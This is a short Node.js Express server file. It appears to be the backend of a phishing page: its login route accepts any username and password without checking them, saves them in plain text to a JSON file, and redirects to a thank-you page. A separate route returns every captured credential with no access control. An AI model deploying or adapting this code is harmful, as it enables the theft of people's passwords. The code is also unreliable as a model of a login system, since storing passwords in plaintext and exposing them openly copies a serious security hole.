const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));
app.use('/admin', express.static('admin'));

app.post('/login', (req, res) => {
  const { username, password } = req.body;
  const entry = { username, password, timestamp: new Date().toISOString() };
  const arr = JSON.parse(fs.readFileSync('logins.json'));
  arr.push(entry);
  fs.writeFileSync('logins.json', JSON.stringify(arr, null, 2));
  res.redirect(`/thankyou.html?user=${encodeURIComponent(username)}`);
});

app.get('/admin/logins', (req, res) => {
  const arr = JSON.parse(fs.readFileSync('logins.json'));
  res.json(arr);
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));